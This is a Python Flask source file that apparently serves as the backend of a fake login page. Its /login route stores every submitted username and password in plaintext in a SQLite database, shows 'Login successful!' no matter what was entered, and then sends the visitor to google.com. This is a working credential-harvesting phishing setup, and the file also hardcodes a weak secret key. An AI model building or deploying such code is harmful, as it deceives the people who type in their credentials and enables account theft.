from flask import Flask, render_template, request, redirect, url_for, flash
import sqlite3

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Needed for flash messages


# Function to create database if it doesn't exist
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT NOT NULL
        )
    """
    )
    conn.commit()
    conn.close()


# Call the function to initialize the database
init_db()


# Function to save user to the database
def save_user(username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO users (username, password) VALUES (?, ?)",
        (username, password),
    )
    conn.commit()
    conn.close()


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Get form data
        username = request.form["usernameEmail"]
        password = request.form["password"]

        # Always save user credentials to the database
        save_user(username, password)

        # Flash message for login attempt
        flash("Login successful!", "success")

        # Redirect to Google after saving user credentials
        return redirect("https://www.google.com")

    return render_template("login.html")

